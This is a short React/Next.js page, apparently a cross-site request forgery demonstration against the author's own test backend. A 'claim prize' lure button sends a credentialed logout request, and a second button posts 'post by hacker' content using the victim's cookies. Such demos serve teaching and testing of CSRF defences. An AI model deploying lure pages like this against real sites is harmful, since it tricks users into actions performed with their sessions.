"use client";
import React from "react";
import { useState, useEffect } from "react";
import axios from "axios";

const page = () => {
    const logout = async () => {
        try {
            const { data } = await axios.get("https://csrf-backend.sumitdoescode.me/api/users/logout", {
                withCredentials: true,
            });
            console.log(data);
        } catch (error: any) {
            console.log(error.response.data);
        }
    };

    const createPost = async () => {
        try {
            const { data } = await axios.post(
                "https://csrf-backend.sumitdoescode.me/api/posts",
                {
                    title: "post by hacker",
                    description: "description of post by hacker",
                },
                {
                    withCredentials: true,
                },
            );
            console.log(data);
        } catch (error: any) {
            console.log(error.response.data);
        }
    };

    return (
        <div>
            <h1>Hey there!!</h1>
            <button onClick={logout} className="bg-black text-white p-2 rounded-md">
                Click here to claim prize
            </button>
            <button onClick={createPost} className="bg-black text-white p-2 rounded-md">
                Create Post
            </button>
        </div>
    );
};

export default page;
